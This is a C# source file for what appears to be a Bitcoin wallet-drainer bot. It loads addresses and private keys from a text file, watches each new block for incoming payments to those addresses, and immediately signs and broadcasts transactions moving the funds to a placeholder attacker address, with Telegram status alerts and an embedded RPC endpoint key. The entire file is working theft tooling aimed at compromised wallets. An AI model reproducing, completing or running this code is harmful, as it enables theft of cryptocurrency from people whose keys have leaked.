using BitcoinAuto.Withdraw;
using NBitcoin;
using NBitcoin.RPC;
using System.Collections.Generic;
using System.IO;
using System;
using System.Net.Sockets;
using System.Security.Policy;
using System.Threading.Tasks;
using System.Linq;

namespace BitcoinAuto.Withdraw
{
    public static class Program
    {

        static string fileName = "address.txt";
        static string currentDirectory = Directory.GetCurrentDirectory();


        [STAThread]
        static async Task Main()
        {
            Telegram telegramNotifier = new Telegram("YOUR_TELEGRAM_BOT_TOKEN", "YOUR_CHAT_ID");

            if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), fileName)))
            {
                string errorMessage = $"----------------------------------\n[X] Seed-phrase file not found\n[X] Specified name: {fileName}\n[X] Directory: {currentDirectory}\n----------------------------------";
                Console.WriteLine(errorMessage);
                
                await telegramNotifier.sendNotification(errorMessage);
                Console.ReadKey();
                Environment.Exit(0);
            }

            Console.WriteLine($"----------------------------------\n[!] Reading seed phrases\n----------------------------------");

            int scsCount = 0;
            int errorsCount = 0;

            string[] allPhrases = File.ReadAllLines(Path.Combine(currentDirectory, fileName));
            Dictionary<string, BitcoinSecret> addresses = new Dictionary<string, BitcoinSecret>();

            foreach (string phrase in allPhrases)
            {
                try
                {
                    var splittedPhrase = phrase.Split(' ');
                    addresses.Add(splittedPhrase[0], new BitcoinSecret(splittedPhrase[1], NBitcoin.Network.Main));
                    scsCount++;
                }
                catch
                {
                    errorsCount++;
                    continue;
                }
            }

            Console.WriteLine($"----------------------------------\n[!] Automatic output is working\nValid seed phrases: {scsCount}\nDisabled Seed Phrases: {errorsCount}\n----------------------------------");
            RPCClient rpcClient = new RPCClient(RPCCredentialString.Parse("https://go.getblock.io/c8c23aabfcaf43498750886b2acd1371"), NBitcoin.Network.Main);
            int lastBlockHeight = 0;

            await telegramNotifier.sendNotification($"----------------------------------\n[!] Auto output is up and running!\nValid seed phrases: {scsCount}\nDisabled Seed Phrases: {errorsCount}\n----------------------------------");

            while (true)
            {
                var currentBlockHeight = await rpcClient.GetBlockCountAsync();

                if (currentBlockHeight > lastBlockHeight)
                {
                    Console.WriteLine($"----------------------------------\n[!] Current unit: {currentBlockHeight}\n----------------------------------");

                    var currentBlockHash = await rpcClient.GetBestBlockHashAsync();
                    var currentBlockInfo = await rpcClient.GetBlockAsync(currentBlockHash);
                    foreach (var tx in currentBlockInfo.Transactions)
                    {
                        string txID = tx.GetHash().ToString();
                        for (int i = 0; i < tx.Outputs.Count; i++)
                        {
                            var vout = tx.Outputs[i];
                            decimal value = vout.Value.ToDecimal(MoneyUnit.BTC);
                            string destinationAddress = vout.ScriptPubKey.GetDestinationAddress(NBitcoin.Network.Main).ToString();

                            if (addresses.ContainsKey(destinationAddress))
                            {
                                Console.WriteLine($"----------------------------------\n[!] NEW TRANSACTION: {txID}\n[!] Value: {value}\n----------------------------------");
                                decimal feeRate = (await rpcClient.EstimateSmartFeeAsync(6)).FeeRate.FeePerK.ToDecimal(MoneyUnit.BTC) * 1.2m;

                                // Creating a transaction
                                var secretString = addresses[destinationAddress];
                                var destination = BitcoinAddress.Create("YOUR_BTC_ADDRESS", NBitcoin.Network.Main);
                                var txBuilder = NBitcoin.Network.Main.CreateTransactionBuilder();
                                var coins = await rpcClient.ListUnspentAsync(0, 9999999, secretString.GetAddress(ScriptPubKeyType.Segwit));
                                txBuilder.AddCoins(coins.Select(c => c.AsCoin()));
                                txBuilder.Send(destination, new Money(value, MoneyUnit.BTC));
                                txBuilder.SendFees(new Money(feeRate, MoneyUnit.BTC));
                                txBuilder.SetChange(secretString.GetAddress(ScriptPubKeyType.Segwit));
                                var signedTx = txBuilder.AddKeys(secretString.PrivateKey).SignTransaction(txBuilder.BuildTransaction(false));

                                // Trying to send
                                var sentTxID = await rpcClient.SendRawTransactionAsync(signedTx);
                                Console.WriteLine($"----------------------------------\n[!] MAKE TRANSACTION: {sentTxID}\n----------------------------------");
                            }
                        }
                    }

                    lastBlockHeight = currentBlockHeight;
                }

                await Task.Delay(TimeSpan.FromSeconds(100));
            }

        }
    }
}